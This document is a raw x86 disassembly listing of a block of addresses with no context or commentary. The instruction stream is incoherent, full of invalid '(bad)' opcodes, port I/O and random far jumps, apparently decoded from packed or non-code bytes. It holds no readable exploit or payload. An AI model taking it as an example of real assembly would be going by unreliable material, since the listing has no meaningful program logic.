  40e7df:	nop
  40e7e0:	hlt    
  40e7e1:	stc    
  40e7e2:	xor    DWORD PTR [ebx+0x1d],ecx
  40e7e5:	inc    esi
  40e7e6:	cmp    dh,0x86
  40e7e9:	xchg   ebp,eax
  40e7ea:	push   ebx
  40e7eb:	dec    esi
  40e7ec:	int3   
  40e7ed:	jb     0x40e7d5
  40e7ef:	shr    BYTE PTR [edi],cl
  40e7f1:	dec    ecx
  40e7f2:	sub    DWORD PTR [ecx+ebp*1+0x7b],0xf9266025
  40e7fa:	push   ecx
  40e7fb:	sar    DWORD PTR [ebx-0x17],0x88
  40e7ff:	ins    DWORD PTR es:[edi],dx
  40e800:	add    DWORD PTR [edi],esi
  40e802:	cmp    DWORD PTR [edi+0x47bae4d8],edi
  40e808:	cmp    al,0xf3
  40e80a:	out    dx,eax
  40e80b:	xchg   esp,eax
  40e80c:	mov    cl,0x2f
  40e80e:	and    eax,0x42c42f
  40e813:	push   eax
  40e814:	adc    BYTE PTR [edi],bh
  40e816:	adc    BYTE PTR [ecx],0x99
  40e819:	sbb    DWORD PTR [ebp+0x2b],edi
  40e81c:	fucomip st,st(3)
  40e81e:	cmp    al,0xba
  40e820:	inc    esi
  40e821:	sbb    DWORD PTR [esi],edx
  40e823:	scas   eax,DWORD PTR es:[edi]
  40e824:	jge    0x40e843
  40e826:	push   0x68ac3a60
  40e82b:	xlat   BYTE PTR ds:[ebx]
  40e82c:	loop   0x40e819
  40e82e:	loope  0x40e889
  40e830:	dec    edx
  40e831:	loop   0x40e83b
  40e833:	jmp    0x769f:0xcc0c1076
  40e83a:	pop    ebx
  40e83b:	lahf   
  40e83c:	mov    ebx,0x3914d776
  40e841:	(bad)  
  40e842:	jnp    0x40e891
  40e844:	mov    bh,BYTE PTR [ebp-0x2e17af7f]
  40e84a:	pop    esi
  40e84b:	push   esp
  40e84c:	add    esp,ebx
  40e84e:	imul   esp,DWORD PTR [ebx-0x32cdad7],0xffffffce
  40e855:	jbe    0x40e862
  40e857:	in     eax,dx
  40e858:	push   esi
  40e859:	test   BYTE PTR [edx-0x10],bh
  40e85c:	test   DWORD PTR [ebx],0x304eb079
  40e862:	enter  0x27f3,0x68
  40e866:	dec    ebx
  40e867:	(bad)  
  40e868:	fwait
  40e869:	scas   eax,DWORD PTR es:[edi]
  40e86a:	loope  0x40e847
  40e86c:	sub    al,0x96
  40e86e:	push   0xe69a55f8
  40e873:	xor    dh,BYTE PTR [esi]
  40e875:	pusha  
  40e876:	mov    eax,0x20f979fc
  40e87b:	sbb    bl,cl
  40e87d:	mov    cl,0x8
  40e87f:	or     ah,dl
  40e881:	inc    esi
  40e882:	lods   eax,DWORD PTR ds:[esi]
  40e883:	and    eax,0x50a12c9
  40e888:	enter  0x4011,0xdd
  40e88c:	test   al,0x1c
  40e88e:	xor    al,0x1b
  40e890:	xchg   ebp,eax
  40e891:	les    edx,FWORD PTR [eax-0x7bc841ae]
  40e897:	fs enter 0x1952,0x66
  40e89c:	lea    ebp,[eax-0x664dc0c7]
  40e8a2:	pop    esi
  40e8a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8a4:	dec    edi
  40e8a5:	aaa    
  40e8a6:	push   cs
  40e8a7:	sar    BYTE PTR [ebx],0x1a
  40e8aa:	sub    al,0xe9
  40e8ac:	pop    ds
  40e8ad:	push   ebx
  40e8ae:	test   BYTE PTR [ebx],bh
  40e8b0:	ja     0x40e8e8
  40e8b2:	dec    edx
  40e8b3:	imul   eax,ebx,0x85ab889c
  40e8b9:	inc    BYTE PTR [edx+0x66a8d538]
  40e8bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8c0:	in     al,dx
  40e8c1:	arpl   WORD PTR [edi+0x41],sp
  40e8c4:	hlt    
  40e8c5:	(bad)  
  40e8c6:	mov    al,ds:0x3265cf35
  40e8cb:	xchg   ebx,eax
  40e8cc:	into   
  40e8cd:	pop    ds
  40e8ce:	std    
  40e8cf:	(bad)  
  40e8d0:	fimul  WORD PTR [esi]
  40e8d2:	es push edi
  40e8d4:	sahf   
  40e8d5:	fadd   DWORD PTR [ebx]
  40e8d7:	nop    DWORD PTR [edi-0x1f]
  40e8db:	jmp    0xfaa6d9b9
  40e8e0:	xchg   ebx,eax
  40e8e1:	stos   BYTE PTR es:[edi],al
  40e8e2:	mov    DWORD PTR [eax-0x34],ebp
  40e8e5:	or     ebp,DWORD PTR [edx-0x5a]
  40e8e8:	outs   dx,BYTE PTR ds:[esi]
  40e8e9:	ret    
  40e8ea:	cld    
  40e8eb:	add    ah,bl
  40e8ed:	das    
  40e8ee:	mov    dl,0xb4
  40e8f0:	cmc    
  40e8f1:	mov    ecx,0xed50e9ee
  40e8f6:	jg     0x40e8b8
  40e8f8:	fsub   DWORD PTR [esi-0x13]
  40e8fb:	push   edx
  40e8fc:	dec    esp
  40e8fd:	cmp    ecx,DWORD PTR [eax]
  40e8ff:	and    DWORD PTR [edi-0x80],ebp
  40e902:	popa   
  40e903:	(bad)  [edi-0x67fcf6a5]
  40e909:	cmp    ch,BYTE PTR [ebx+0xed9da03]
  40e90f:	or     BYTE PTR [ecx-0x5654a5d8],dl
  40e915:	test   esi,eax
  40e917:	sub    eax,0x51b7110e
  40e91c:	jmp    0x40e929
  40e91e:	cwde   
  40e91f:	sbb    esi,DWORD PTR [esi-0x34]
  40e922:	mov    ch,0xe3
  40e924:	fs dec edx
  40e926:	pop    ss
  40e927:	push   edi
  40e928:	pop    esp
  40e929:	adc    DWORD PTR [ebp-0x4576e89f],0xffffffe4
  40e930:	ja     0x40e983
  40e932:	mov    al,0x38
  40e934:	scas   al,BYTE PTR es:[edi]
  40e935:	jae    0x40e8d9
  40e937:	dec    esp
  40e938:	data16 rcr BYTE PTR [ebx+0x41],1
  40e93c:	push   edi
  40e93d:	mov    al,ds:0x2b96838
  40e942:	add    eax,0xf0fc3719
  40e947:	fcmovnb st,st(4)
  40e949:	adc    DWORD PTR [esi-0x56a33298],esp
  40e94f:	loop   0x40e92d
  40e951:	out    0x40,eax
  40e953:	cmp    DWORD PTR cs:[eax-0x23],edi
  40e957:	cmc    
  40e958:	icebp  
  40e959:	push   0x6d40d368
  40e95e:	dec    esp
  40e95f:	sbb    edx,esp
  40e961:	and    eax,0x2478d24a
  40e966:	sbb    eax,0xa3665295
  40e96b:	add    DWORD PTR [edx+0x38],ecx
  40e96e:	int    0x3e
  40e970:	lods   eax,DWORD PTR ds:[esi]
  40e971:	mov    BYTE PTR [ebp-0x4a],bh
  40e974:	push   ds
  40e975:	(bad)  
  40e976:	call   FWORD PTR [edx+eax*4]
  40e979:	add    al,0xb5
  40e97b:	pop    ss
  40e97c:	push   0xffffffdd
  40e97e:	pop    esp
  40e97f:	and    BYTE PTR [ebx],bl
  40e981:	jmp    0x40e9da
  40e983:	adc    eax,0xc2b808a5
  40e988:	or     ch,ah
  40e98a:	loop   0x40e99c
  40e98c:	fimul  DWORD PTR [edx-0x53de75d9]
  40e992:	arpl   WORD PTR [ebx+0x5b],dx
  40e995:	xchg   edx,eax
  40e996:	cli    
  40e997:	das    
  40e998:	mov    dl,0x1e
  40e99a:	cdq    
  40e99b:	or     DWORD PTR [edx+0x79b7db09],ebp
  40e9a1:	leave  
  40e9a2:	mov    ebx,0x12840bc4
  40e9a7:	ja     0x40e9b4
  40e9a9:	pushf  
  40e9aa:	pop    ebp
  40e9ab:	adc    DWORD PTR [edx],eax
  40e9ad:	jp     0x40e994
  40e9af:	cmp    eax,0x2d6cf2d
  40e9b4:	inc    edi
  40e9b5:	mov    al,0x2
  40e9b7:	fs loope 0x40e9b8
  40e9ba:	cmp    al,ch
  40e9bc:	rol    BYTE PTR [edi-0x23],0xb6
  40e9c0:	es xchg ebx,eax
  40e9c2:	sti    
  40e9c3:	mov    ebp,0x7f8a6e14
  40e9c8:	lea    ebp,[edx-0x75a26de4]
  40e9ce:	push   esi
  40e9cf:	test   al,0x56
  40e9d1:	das    
  40e9d2:	and    BYTE PTR [ebp+edx*1-0x4e0fe795],al
  40e9d9:	mov    WORD PTR [esi],?
  40e9db:	jmp    0x40ea51
  40e9dd:	push   eax
  40e9de:	adc    eax,0x83347b0a
  40e9e3:	rcr    BYTE PTR [ebx+0x36694f01],cl
  40e9e9:	push   0x6d
  40e9eb:	sbb    BYTE PTR [edx-0x46],ch
  40e9ee:	fmul   QWORD PTR [ebp-0x38]
  40e9f1:	push   ds
  40e9f2:	and    bl,dl
  40e9f4:	xchg   esp,eax
  40e9f5:	call   0x756d:0x27561937
  40e9fc:	rcl    DWORD PTR [edi+eiz*4],0x95
  40ea00:	in     al,dx
  40ea01:	xchg   esp,eax
  40ea02:	push   es
  40ea03:	mov    al,0x8a
  40ea05:	inc    esp
  40ea06:	sub    DWORD PTR fs:[ecx],esi
  40ea09:	push   ebp
  40ea0a:	stos   BYTE PTR es:[edi],al
  40ea0b:	into   
  40ea0c:	or     ah,ah
  40ea0e:	or     BYTE PTR [esi],al
  40ea10:	(bad)  
  40ea11:	call   0xca3d:0x15f372c0
  40ea18:	jge    0x40e9e6
  40ea1a:	sbb    al,0xfc
  40ea1c:	push   edx
  40ea1d:	clc    
  40ea1e:	loop   0x40e9bb
  40ea20:	sbb    BYTE PTR [esp+ebx*4+0x3612e79e],0x9
  40ea28:	push   esi
  40ea29:	jmp    0xe478:0xbc247cec
  40ea30:	adc    DWORD PTR [edi+0xa],esi
  40ea33:	data16 cmp BYTE PTR [esi+0x63],ah
  40ea37:	out    dx,al
  40ea38:	push   ss
  40ea39:	aad    0x1
  40ea3b:	mov    dl,0x3e
  40ea3d:	jb     0x40ea3a
  40ea3f:	ins    DWORD PTR es:[edi],dx
  40ea40:	pop    esi
  40ea41:	inc    edi
  40ea42:	ret    
  40ea43:	out    0x96,eax
  40ea45:	mov    ebp,0x23a8220a
  40ea4a:	jl     0x40ea3d
  40ea4c:	loop   0x40eaad
  40ea4e:	lahf   
  40ea4f:	dec    ecx
  40ea50:	jno    0x40eaab
  40ea52:	inc    esp
  40ea53:	sbb    eax,0x5e051d59
  40ea58:	sbb    eax,0xe9aa508a
  40ea5d:	int    0xfc
  40ea5f:	std    
  40ea60:	dec    eax
  40ea61:	push   ebx
  40ea62:	ins    DWORD PTR es:[edi],dx
  40ea63:	sub    ecx,DWORD PTR [ebp-0x18]
  40ea66:	ja     0x40eab8
  40ea68:	adc    bh,BYTE PTR [esi+0xb]
  40ea6b:	xor    al,BYTE PTR [edx-0x38]
  40ea6e:	rcr    eax,cl
  40ea70:	shl    DWORD PTR [eiz*8-0x60cc61dd],1
  40ea77:	sub    bl,BYTE PTR [esi+0x573b1aa]
  40ea7d:	nop
  40ea7e:	mov    BYTE PTR [ecx+0x3d042a93],bh
  40ea84:	mov    cl,0x94
  40ea86:	jmp    0x6e25:0x4e3d6156
  40ea8d:	or     al,0x8f
  40ea8f:	sub    bl,BYTE PTR [ecx]
  40ea91:	pop    ds
  40ea92:	jecxz  0x40ea24
  40ea94:	inc    ax
  40ea96:	cmp    ebp,edi
  40ea98:	outs   dx,DWORD PTR ds:[esi]
  40ea99:	retf   
  40ea9a:	cli    
  40ea9b:	test   al,0x2d
  40ea9d:	xor    DWORD PTR [eax-0x60],edi
  40eaa0:	sub    al,0x82
  40eaa2:	sub    BYTE PTR [ebx-0x44c54202],dl
  40eaa8:	inc    ecx
  40eaa9:	mov    bh,0x53
  40eaab:	ja     0x40eadf
  40eaad:	fs mov edi,0x14f85e7d
  40eab3:	bound  ebx,QWORD PTR [eax-0x1d]
  40eab6:	xor    al,0x6f
  40eab8:	jbe    0x40ea82
  40eaba:	xchg   esi,eax
  40eabb:	mov    ebp,0x8234ca4e
  40eac0:	mov    cl,0x85
  40eac2:	mov    dl,0x54
  40eac4:	rcl    BYTE PTR [eax],1
  40eac6:	cmp    eax,0x4ab95c76
  40eacb:	cli    
  40eacc:	aaa    
  40eacd:	repnz pop edx
  40eacf:	xchg   ecx,eax
  40ead0:	xor    DWORD PTR [edi+ebx*8],esp
  40ead3:	xor    dh,BYTE PTR [eax-0xf19ba28]
  40ead9:	or     eax,0xa2fef83e
  40eade:	(bad)  
  40eadf:	push   DWORD PTR [ebx]
  40eae1:	retf   
  40eae2:	dec    esp
  40eae3:	dec    esp
  40eae4:	cmp    dh,BYTE PTR [ebx]
  40eae6:	mov    bh,0x8
  40eae8:	pop    eax
  40eae9:	xchg   ebx,eax
  40eaea:	sub    DWORD PTR [edi-0x47e7c231],esi
  40eaf0:	sahf   
  40eaf1:	aad    0xbe
  40eaf3:	cwde   
  40eaf4:	ins    BYTE PTR es:[edi],dx
  40eaf5:	div    cl
  40eaf7:	nop
  40eaf8:	cmp    al,0x4a
  40eafa:	lahf   
  40eafb:	sti    
  40eafc:	pop    ebp
  40eafd:	lods   eax,DWORD PTR ds:[esi]
  40eafe:	jbe    0x40eab2
  40eb00:	add    esp,DWORD PTR [ecx-0x9]
  40eb03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb04:	adc    BYTE PTR [edx-0x3bc48630],cl
  40eb0a:	retf   
  40eb0b:	fwait
  40eb0c:	sub    BYTE PTR [ebp+0x44845ad4],0x37
  40eb13:	xor    DWORD PTR [esi+0x7205addf],esi
  40eb19:	es cmc 
  40eb1b:	dec    edi
  40eb1c:	dec    eax
  40eb1d:	dec    eax
  40eb1e:	sbb    BYTE PTR [ebx],dl
  40eb20:	adc    DWORD PTR [edx-0x4b],0xffffff80
  40eb24:	xchg   esp,eax
  40eb25:	and    BYTE PTR [esi],0x9
  40eb28:	inc    ebx
  40eb29:	stos   BYTE PTR es:[edi],al
  40eb2a:	out    dx,eax
  40eb2b:	cmp    eax,0x5a658757
  40eb30:	push   cs
  40eb31:	xor    al,0x7c
  40eb33:	(bad)  
  40eb35:	push   0xbe372f45
  40eb3a:	xor    eax,0x87b93a11
  40eb3f:	fldcw  WORD PTR [ebx+0x18]
  40eb42:	ja     0x40eb75
  40eb44:	stc    
  40eb45:	sbb    eax,0x4b91a5d7
  40eb4a:	fadd   QWORD PTR [esi-0x70]
  40eb4d:	sub    esp,eax
  40eb4f:	rol    DWORD PTR [ecx],cl
  40eb51:	and    eax,0xb9fe439
  40eb56:	add    dh,BYTE PTR [edx+0x1a]
  40eb59:	dec    ebp
  40eb5a:	dec    edi
  40eb5b:	hlt    
  40eb5c:	out    0xd1,eax
  40eb5e:	(bad)  
  40eb60:	dec    ebx
  40eb61:	and    ch,BYTE PTR [edi]
  40eb63:	adc    al,0x65
  40eb65:	fwait
  40eb66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb67:	jg     0x40eb0d
  40eb69:	cmc    
  40eb6a:	push   ds
  40eb6b:	push   edi
  40eb6c:	pop    ecx
  40eb6d:	mov    ebx,0x9993b432
  40eb72:	sbb    bl,BYTE PTR ds:0x5002edb0
  40eb78:	or     al,0xc9
  40eb7a:	inc    ebp
  40eb7b:	cmp    BYTE PTR [esi+eiz*2+0x33],al
  40eb7f:	add    eax,0x91a078b1
  40eb84:	adc    al,0xa7
  40eb86:	xchg   esp,eax
  40eb87:	xchg   edi,eax
  40eb88:	pusha  
  40eb89:	jecxz  0x40eb91
  40eb8b:	ret    0x30dc
  40eb8e:	push   0xebc54721
  40eb93:	test   BYTE PTR [ebx-0xccee9ef],ah
  40eb99:	ficom  WORD PTR [edx+esi*2-0x4d]
  40eb9d:	hlt    
  40eb9e:	hlt    
  40eb9f:	pop    ecx
  40eba0:	push   ebx
  40eba1:	dec    ecx
  40eba2:	xchg   ebp,eax
  40eba3:	in     al,dx
  40eba4:	fnstenv [edx+0x60f8dc41]
  40ebaa:	xchg   edi,eax
  40ebab:	js     0x40ebdd
  40ebad:	mov    ebp,0x14ef7c33
  40ebb3:	cld    
  40ebb4:	mov    ebx,DWORD PTR [esp+eiz*2+0x50]
  40ebb8:	jns    0x40eb4e
  40ebba:	sub    dl,ah
  40ebbc:	mov    esi,0x8a41396
  40ebc1:	mov    ch,ch
  40ebc3:	mov    cl,BYTE PTR [eax]
  40ebc5:	ja     0x40ec32
  40ebc7:	jnp    0x40ebe6
  40ebc9:	imul   edx,eax,0xffffffdb
  40ebcc:	jb     0x40ec19
  40ebce:	jle    0x40eb80
  40ebd0:	push   es
  40ebd1:	adc    ebx,ebx
  40ebd3:	nop
  40ebd4:	leave  
  40ebd5:	hlt    
  40ebd6:	stc    
  40ebd7:	jae    0x40ebdb
  40ebd9:	(bad)  
  40ebdb:	jb     0x40ebf5
  40ebdd:	ins    BYTE PTR es:[edi],dx
  40ebde:	cwde   
  40ebdf:	mov    eax,0xbf7560e3
  40ebe4:	or     al,ch
  40ebe6:	cmpxchg DWORD PTR [eax],eax
  40ebe9:	jnp    0x40eb79
  40ebeb:	sub    DWORD PTR [eax+ebp*4],eax
  40ebee:	push   ecx
  40ebef:	into   
  40ebf0:	mov    cl,ah
  40ebf2:	mov    bl,0x6d
  40ebf4:	jmp    0x40eb7f
  40ebf6:	mov    ah,0xce
  40ebf8:	sbb    bh,BYTE PTR [ecx+0x3c]
  40ebfb:	pop    ebx
  40ebfc:	mov    edi,0x4f800dd1
  40ec01:	mov    eax,0xeaeb20f8
  40ec06:	add    DWORD PTR [eax],esi
  40ec08:	sub    bh,al
  40ec0a:	fidiv  DWORD PTR [ebp+0x65]
  40ec0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec0e:	add    BYTE PTR [ebx],cl
  40ec10:	or     eax,0x84ade805
  40ec15:	daa    
  40ec16:	cmp    ebp,0xffffff89
  40ec19:	in     al,0x27
  40ec1b:	outs   dx,BYTE PTR ds:[esi]
  40ec1c:	adc    BYTE PTR [edi],dl
  40ec1e:	xchg   edi,eax
  40ec1f:	mov    eax,ds:0x7036da25
  40ec24:	out    dx,al
  40ec25:	sbb    DWORD PTR [ebx+ebp*1-0x28dd2386],edi
  40ec2c:	mov    edx,0x46e974c9
  40ec31:	leave  
  40ec32:	pop    ebp
  40ec33:	sub    edx,DWORD PTR [ebx+0x1b]
  40ec36:	and    edi,0xffffffe5
  40ec39:	neg    edx
  40ec3b:	repz mov WORD PTR [ebx+eiz*4+0x3],cs
  40ec40:	stos   BYTE PTR es:[edi],al
  40ec41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec42:	dec    ebx
  40ec43:	sahf   
  40ec44:	in     al,dx
  40ec45:	xor    ah,BYTE PTR [eax+0x29a17afb]
  40ec4b:	inc    eax
  40ec4c:	pop    es
  40ec4d:	mov    cs,WORD PTR [esi-0x608f33f4]
  40ec53:	xor    BYTE PTR [eax],ch
  40ec55:	pop    ebx
  40ec56:	(bad)  
  40ec57:	mov    edx,edx
  40ec59:	sbb    DWORD PTR [eax],esi
  40ec5b:	sbb    eax,0x3799f288
  40ec60:	mov    esp,0x154a0018
  40ec65:	jg     0x40ec40
  40ec67:	jmp    0x9e97:0x5461fb34
  40ec6e:	xor    BYTE PTR [esi],al
  40ec70:	lock out 0x66,eax
  40ec73:	(bad)  
  40ec74:	sub    BYTE PTR [edi],ah
  40ec76:	xchg   esp,eax
  40ec77:	sbb    BYTE PTR [edi+0x787d1096],dl
  40ec7d:	bnd jo 0x40ec5c
  40ec80:	and    al,0x8b
  40ec82:	ins    BYTE PTR es:[edi],dx
  40ec83:	dec    edx
  40ec84:	cs cmp eax,0x793385d3
  40ec8a:	mov    eax,ds:0x231539b8
  40ec8f:	iret   
  40ec90:	ds aas 
  40ec92:	ror    BYTE PTR [eax],0xb8
  40ec95:	daa    
  40ec96:	(bad)  
  40ec97:	(bad)  
  40ec98:	sub    al,0x4a
  40ec9a:	loop   0x40ec24
  40ec9c:	pop    eax
  40ec9d:	je     0x40ed02
  40ec9f:	sar    DWORD PTR [ebp+0x22],0x73
  40eca3:	or     DWORD PTR ds:0x34f585d9,ecx
  40eca9:	cld    
  40ecaa:	leave  
  40ecab:	xor    BYTE PTR [eax+0x1e9d3ab],dh
  40ecb1:	arpl   WORD PTR [eax-0x69c3952c],sp
  40ecb7:	push   ecx
  40ecb8:	fadd   QWORD PTR [ecx+edx*2]
  40ecbb:	popf   
  40ecbc:	fisttp DWORD PTR [esi-0x2b47ccbc]
  40ecc3:	mov    dh,0x98
  40ecc5:	sub    bh,ch
  40ecc7:	sub    eax,0x8338eb2
  40eccc:	dec    edi
  40eccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecce:	lock fstp QWORD PTR [ebx+0x78dd585]
  40ecd5:	neg    ecx
  40ecd7:	ret    
  40ecd8:	xor    dl,bh
  40ecda:	mov    ah,0xf9
  40ecdc:	fcomp  DWORD PTR [ebp-0x76a3a849]
  40ece2:	and    ebx,esi
  40ece4:	outs   dx,DWORD PTR ds:[esi]
  40ece5:	and    al,0x4b
  40ece7:	push   ebp
  40ece8:	sahf   
  40ece9:	outs   dx,BYTE PTR ds:[esi]
  40ecea:	test   BYTE PTR [edi-0x13],dl
  40eced:	inc    eax
  40ecee:	inc    esi
  40ecef:	sub    ebp,eax
  40ecf1:	test   DWORD PTR [eax+ecx*1-0x5f5f5426],0x743ff20e
  40ecfc:	mov    ecx,eax
  40ecfe:	pop    ecx
  40ecff:	in     al,dx
  40ed00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed01:	add    al,0x36
  40ed03:	rcl    BYTE PTR [ebp-0x4b],cl
  40ed06:	idiv   BYTE PTR [edi]
  40ed08:	jmp    0x40ed4a
  40ed0a:	stc    
  40ed0b:	call   0xde4cff6f
  40ed10:	jno    0x40ed2a
  40ed12:	jle    0x40ec96
  40ed14:	jo     0x40ed08
  40ed16:	fisttp WORD PTR [ebp-0x3ceb44e0]
  40ed1c:	xor    eax,0xeb4c4685
  40ed21:	pop    eax
  40ed22:	rcl    dl,cl
  40ed24:	(bad)  
  40ed25:	cdq    
  40ed26:	push   edx
  40ed27:	sub    bl,cl
  40ed29:	cli    
  40ed2a:	mov    eax,ds:0xfe0c3c46
  40ed2f:	retf   
  40ed30:	pop    esp
  40ed31:	bound  ebx,QWORD PTR ds:0x63af4aee
  40ed37:	inc    ebx
  40ed38:	mov    DWORD PTR [esi+0x680e2998],esi
  40ed3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed3f:	(bad)  
  40ed40:	fdiv   st(4),st
  40ed42:	jo     0x40eda9
  40ed44:	jmp    0xad42:0x7aff68a2
  40ed4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed4c:	or     eax,0xa554cf4c
  40ed51:	xchg   DWORD PTR [eax],esp
  40ed53:	xlat   BYTE PTR ds:[ebx]
  40ed54:	mov    al,ds:0x98c2d80b
  40ed59:	adc    ebx,DWORD PTR [edx+eax*1+0x235fbe17]
  40ed60:	hlt    
  40ed61:	pop    ebp
  40ed62:	add    DWORD PTR [ebx+0x53],esp
  40ed65:	jle    0x40ecee
  40ed67:	mov    cl,0x92
  40ed69:	scas   al,BYTE PTR es:[edi]
  40ed6a:	fcmovbe st,st(3)
  40ed6c:	cli    
  40ed6d:	out    0x5a,al
  40ed6f:	sub    eax,0x4338026b
  40ed74:	jno    0x40ed68
  40ed76:	jmp    0x40edb0
  40ed78:	dec    ebx
  40ed79:	add    BYTE PTR [ebx+ebp*2+0x29],0x54
  40ed7e:	dec    ecx
  40ed7f:	(bad)
  40ed82:	adc    bh,BYTE PTR [ebp-0xf]
  40ed85:	jp     0x40edb7
  40ed87:	adc    esi,esp
  40ed89:	and    ebx,DWORD PTR [edx+0x5b]
  40ed8c:	sahf   
  40ed8d:	or     dh,cl
  40ed8f:	ja     0x40ed2f
  40ed91:	mov    dl,0xeb
  40ed93:	jno    0x40edcc
  40ed95:	sti    
  40ed96:	cs xchg ecx,eax
  40ed98:	cmp    DWORD PTR [ecx+0x6b],edx
  40ed9b:	dec    ebp
  40ed9c:	pop    ss
  40ed9d:	dec    edx
  40ed9e:	mov    eax,0x3d35dbea
  40eda3:	and    al,0x62
  40eda5:	and    bl,al
  40eda7:	add    eax,0x4aeb9213
  40edac:	dec    ebp
  40edad:	jmp    0x40ede0
  40edaf:	mov    ebp,0xb83a9a1
  40edb4:	or     ah,ah
  40edb6:	xchg   ebp,eax
  40edb7:	aaa    
  40edb8:	dec    esi
  40edb9:	dec    edx
  40edba:	lods   eax,DWORD PTR ds:[esi]
  40edbb:	xchg   ebx,esi
  40edbd:	int3   
  40edbe:	jbe    0x40ed98
  40edc0:	shr    BYTE PTR [ebx],0xe6
  40edc3:	cmp    eax,0x9d4bc91e
  40edc8:	xor    eax,0xd7912305
  40edcd:	sub    DWORD PTR [ebp-0x5ef384a],ecx
  40edd3:	data16 ds cli 
  40edd6:	hlt    
  40edd7:	inc    ebx
  40edd8:	stos   BYTE PTR es:[edi],al
  40edd9:	mov    edi,0x753b00f0
  40edde:	in     al,0x1c
  40ede0:	outs   dx,DWORD PTR ds:[esi]
  40ede1:	call   DWORD PTR [eiz*2+0x7807b296]
  40ede8:	popa   
  40ede9:	ins    BYTE PTR es:[edi],dx
  40edea:	mov    dl,0xa5
  40edec:	mov    bl,BYTE PTR [eax+eax*4]
  40edef:	loop   0x40ee1b
  40edf1:	lock aas 
  40edf3:	and    bl,al
  40edf5:	scas   eax,DWORD PTR es:[edi]
  40edf6:	mov    al,ds:0x4148cb5
  40edfb:	pusha  
  40edfc:	ret    0x8bf6
  40edff:	std    
  40ee00:	jo     0x40ee67
  40ee02:	mov    al,0xff
  40ee04:	adc    BYTE PTR ds:0x4dbb65cc,al
  40ee0a:	dec    ebx
  40ee0b:	iret   
  40ee0c:	ins    DWORD PTR es:[edi],dx
  40ee0d:	imul   esi,DWORD PTR [ecx-0x3b],0x4d
  40ee11:	loope  0x40ee65
  40ee13:	inc    esi
  40ee14:	data16 jecxz 0x40edc4
  40ee17:	jmp    0xe4e4:0x793a5f6f
  40ee1e:	xlat   BYTE PTR ds:[ebx]
  40ee1f:	mov    esp,0x7db4eebf
  40ee24:	and    ch,BYTE PTR [edi+0x79]
  40ee27:	fmul   DWORD PTR [edx+0x7e53a09a]
  40ee2d:	test   al,0x6c
  40ee2f:	push   0x5534d93d
  40ee34:	js     0x40ee60
  40ee36:	ins    BYTE PTR es:[edi],dx
  40ee37:	call   0x226c:0x9610fac2
  40ee3e:	je     0x40eead
  40ee40:	div    DWORD PTR [edi+ebx*4-0x7160c19e]
  40ee47:	loop   0x40ee18
  40ee49:	xchg   esi,edx
  40ee4b:	test   DWORD PTR [esi+ecx*4-0x39],edi
  40ee4f:	xor    esp,edx
  40ee51:	pop    esp
  40ee52:	mov    DWORD PTR [ebx],edx
  40ee54:	(bad)  
  40ee55:	jg     0x40ee58
  40ee57:	or     DWORD PTR [eax-0x6a],0x76
  40ee5b:	sbb    al,0x5
  40ee5d:	mov    eax,ds:0xf7ecedae
  40ee62:	push   ebx
  40ee63:	rol    BYTE PTR [ebp+0x65263dab],cl
  40ee69:	and    DWORD PTR [edi],edi
  40ee6b:	cdq    
  40ee6c:	or     eax,0xbe13ab00
  40ee71:	jg     0x40eecf
  40ee73:	popf   
  40ee74:	imul   esp,DWORD PTR [ebx+ecx*8],0x537e41ae
  40ee7b:	jne    0x40ee69
  40ee7d:	mov    ss,edi
  40ee7f:	push   0x6218beda
  40ee84:	sub    BYTE PTR [edx+0x1],ch
  40ee87:	push   0x36c4646c
  40ee8c:	sbb    cl,bh
  40ee8e:	mov    ebp,0xc4e87e3f
  40ee93:	loope  0x40ee81
  40ee95:	mov    bh,dh
  40ee97:	or     BYTE PTR [edx-0x5b],al
  40ee9a:	scas   eax,DWORD PTR es:[edi]
  40ee9b:	cs push es
  40ee9d:	mov    gs,WORD PTR [ecx+0x58]
  40eea0:	xadd   ebp,ebp
  40eea3:	enter  0xa477,0x23
  40eea7:	xchg   esp,eax
  40eea8:	fcomi  st,st(4)
  40eeaa:	fstp   TBYTE PTR [edx]
  40eeac:	mov    ch,0x6f
  40eeae:	lock sub al,0xbd
  40eeb1:	rcr    ah,cl
  40eeb3:	xchg   esi,eax
  40eeb4:	jl     0x40ef1a
  40eeb6:	daa    
  40eeb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeb8:	stc    
  40eeb9:	repnz std 
  40eebb:	jns    0x40ef3c
  40eebd:	cmp    al,dh
  40eebf:	push   WORD PTR [ebp+ebx*2-0x50842ea]
  40eec7:	mov    edx,0x5643b056
  40eecc:	inc    ecx
  40eecd:	and    BYTE PTR [ebx+0x2690958c],bh
  40eed3:	out    dx,eax
  40eed4:	inc    edi
  40eed5:	adc    eax,DWORD PTR [edx]
  40eed7:	inc    eax
  40eed8:	ss popf 
  40eeda:	cli    
  40eedb:	mov    ?,WORD PTR [ebp+edx*2-0x13]
  40eedf:	outs   dx,BYTE PTR ds:[esi]
  40eee0:	das    
  40eee1:	xlat   BYTE PTR ds:[ebx]
  40eee2:	push   ebx
  40eee3:	mov    al,0xd4
  40eee5:	add    edx,ecx
  40eee7:	push   es
  40eee8:	mov    edi,0x711df881
  40eeed:	repnz sub eax,0xf17b53a0
  40eef3:	add    edi,DWORD PTR [ecx-0x72a54220]
  40eef9:	in     eax,0xf2
  40eefb:	push   esi
  40eefc:	ins    BYTE PTR es:[edi],dx
  40eefd:	cmp    eax,DWORD PTR [edi]
  40eeff:	mov    edi,0x1d726397
  40ef04:	call   0xfcaefa23
  40ef09:	or     eax,0xc8c1b4d9
  40ef0e:	out    dx,al
  40ef0f:	imul   dh
  40ef11:	sbb    al,0x87
  40ef13:	dec    edx
  40ef14:	lahf   
  40ef15:	push   ss
  40ef16:	dec    esi
  40ef17:	cmp    eax,0x27b9b33d
  40ef1c:	lds    ebp,FWORD PTR [edi]
  40ef1e:	jb     0x40ef32
